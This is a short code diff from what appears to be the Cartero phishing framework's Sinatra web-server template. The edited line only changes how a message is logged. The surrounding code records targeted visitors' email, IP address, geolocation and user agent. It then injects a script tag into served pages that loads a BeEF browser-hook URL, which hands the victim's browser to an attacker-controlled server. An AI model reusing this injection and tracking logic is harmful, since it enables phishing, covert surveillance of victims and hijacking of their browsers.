@@ -14,7 +14,7 @@ class <%= self.webserver %> < Sinatra::Base
 	alias_method :original_erb, :erb
 	def erb(x)
 		if @data != {} && (BEEF_HOOKED_LIST.include?(@data[:email]) || BEEF_HOOKED_ALL )
-			$stdout.puts "#{Time.now} - HOOKING #{@data[:email] || 'noname@cartero.com'} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+			log "#{Time.now} - HOOKING #{@data[:email] || 'noname@cartero.com'} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
 			original_erb(x).sub("</script>","</script><script src=\"<%= self.hook_url %>\"></script>")
 		end
 	end
